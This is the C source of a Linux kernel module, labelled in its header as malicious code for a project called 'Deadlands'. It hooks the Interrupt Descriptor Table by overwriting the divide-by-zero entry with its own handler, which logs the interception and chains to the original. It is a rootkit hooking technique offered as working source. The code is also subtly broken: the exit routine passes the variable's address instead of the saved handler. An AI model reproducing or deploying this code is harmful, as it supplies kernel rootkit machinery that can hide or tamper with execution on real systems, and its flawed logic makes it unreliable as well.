/*
** hookIDT.c for ** MALICIOUS CODE: PROJECT - DEADLANDS **
** 
** Made by majdi
** Login   <majdi.toumi@gmail.com>
** 
*/

#include <linux/module.h>
#include "hookIDT.h"

/*
** ~ Informations:
*/
MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("[ EpiTek4 ] Strasbourg");

/*
** ~ Initializations:
*/

unsigned long	ptr_idt_table;
unsigned long	pdt_gdt_table;
unsigned long	old_interrupt;



static int	hookIDT_init(void)
{
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - module init\n");

  ptr_idt_table = get_idt_addr();
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - IDT addr: 0x%lx\n", ptr_idt_table);
  epiHook(INT_0, &my_handler);
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - interrupt powned!\n");
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - Trigger divide by zero (INT 0)\n");
  __asm__ volatile ("INT $0");
  return 0;
}

static void	hookIDT_exit(void)
{
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - module exit\n");
  epiHook(INT_0, &old_interrupt);
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - interrupt restored!\n");
}

/*
** ~ Functions:
*/
unsigned long	get_idt_addr(void)
{
  struct s_idtr {
    u16 limit;
    unsigned long addr;
  };
  struct s_idtr idtr;

  __asm__ volatile ("sidt %0" :  "=m" (idtr));
  return idtr.addr;
}

int		epiHook(int nINT, void *new_interrupt)
{
  struct s_descriptorIDT	*idt;
  unsigned long			addr;

  addr = (unsigned long)new_interrupt;
  idt = (struct s_descriptorIDT *)ptr_idt_table;

  old_interrupt = (unsigned long)get_interrupt_from_idt(nINT);
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - Switching interrupt[%d] 0x%p -> 0x%p\n", nINT, (void*)old_interrupt, (void*)new_interrupt);

#ifdef __x86_64

  idt[nINT].offset_hi = (u32)(addr >> 32);
  idt[nINT].offset_mid = (unsigned short)(addr >> 16);
  idt[nINT].offset_lo = (unsigned short)(addr & 0x0000FFFF);

#else // 32 bits

  idt[nINT].offset_hi = (unsigned short)(addr >> 16);
  idt[nINT].offset_lo = (unsigned short)(addr & 0x0000FFFF);

#endif
  return 0;
}

void		*get_interrupt_from_idt(int nINT)
{
  struct s_descriptorIDT	*idt;
  void				*addr;

  idt = &((struct s_descriptorIDT *)ptr_idt_table)[nINT];

#ifdef __x86_64

  addr = (void *)(((u64)idt->offset_hi << 32)) + (((u64)idt->offset_mid << 16) + idt->offset_lo);

#else // 32 bits

  addr = (void *)((idt->offset_hi << 16) + idt->offset_lo);

#endif
  return addr;
}

asmlinkage void my_handler(struct pt_regs * regs, long err_code)
{
  printk(KERN_ALERT "[MSG] deadlands h00k IDT - INTERCEPT IDT^^\n");

  void (*old_int_handler)(struct pt_regs *, long) = (void *)old_interrupt;
  (*old_int_handler)(regs, err_code);
  //__asm__ ("jmp" old_interrupt);
}

/*
** ~ Let's Rock!
*/
module_init(hookIDT_init);
module_exit(hookIDT_exit);
